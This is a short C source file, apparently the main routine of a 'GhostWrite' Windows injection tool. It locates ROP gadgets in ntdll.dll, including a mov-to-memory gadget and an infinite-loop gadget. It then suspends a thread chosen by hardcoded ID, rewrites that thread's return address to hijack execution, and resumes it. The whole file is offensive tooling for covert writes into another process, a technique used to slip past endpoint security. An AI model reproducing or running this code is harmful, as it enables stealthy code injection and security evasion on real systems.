#include "GhostWrite.h"

/*
RtlInitializeGenericTableAvl
48 89 7E 50     mov     [rsi+50h], rdi
48 8B 74 24 40  mov     rsi, [rsp+28h+arg_10]
48 83 C4 20     add     rsp, 20h
5F              pop     rdi
C3              retn

RBX RBP RSI RDI R9 R12 R13 R14 R15
*/

int main(int argc, char* argv[])
{
	GGIF ggGadgetInfo = { 0 };
	ggGadgetInfo.SrcRegister = RDI;
	ggGadgetInfo.DstRegister = RSI;
	ggGadgetInfo.dwPreStackSize = 0x28;
	ggGadgetInfo.RegisterOffset = 0x50;

	ggGadgetInfo.qwGadgetAddress = GwGetGadgetInfo("ntdll.dll", "RtlInitializeGenericTableAvl", 0x58, "48897E*488B7424*4883C4*5FC3");
	ggGadgetInfo.qwAutoLockAddress = GwGetGadgetInfo("ntdll.dll", "RtlIpv6StringToAddressExW", 0x3D2, "EBFE");
	if (!ggGadgetInfo.qwGadgetAddress || !ggGadgetInfo.qwAutoLockAddress)
	{
		printf("[-]: Get Gadget Failure !\r\n");
		return 0;
	}

	HANDLE hThread = NULL;
	CONTEXT ctPureContext = { 0 };
	ctPureContext.ContextFlags = CONTEXT_FULL;
	GwSuspendThread(7220, &hThread, &ctPureContext);

	GwWriteReturnAddress(&hThread, &ggGadgetInfo);

	GwResumeThread(&hThread, &ctPureContext);

	return 0;
}